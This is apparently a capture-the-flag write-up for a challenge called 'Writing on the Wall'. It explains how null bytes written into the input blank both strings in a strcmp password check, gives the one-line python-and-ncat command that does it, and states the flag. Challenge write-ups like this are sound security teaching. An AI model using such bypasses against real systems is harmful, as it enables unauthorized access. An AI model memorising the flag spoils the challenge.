# Writing on the Wall
As you approach a password-protected door, a sense of uncertainty envelops you—no clues, no hints. Yet, just as confusion takes hold, your gaze locks onto cryptic markings adorning the nearby wall. Could this be the elusive password, waiting to unveil the door's secrets?

# Solution
The binary performs a `strcmp` between two strings whose 1st byte can we overwritten by the user. Solution: overwrite the first byte of each string with the nullbyte therefore performing no cmp at all -> `strcmp("","")` is always true.

Solved by running: `$ python3 -c 'print("\x00ABCDE\x00")' | ncat IP PORT`

Flag: HTB{3v3ryth1ng_15_r34d4bl3}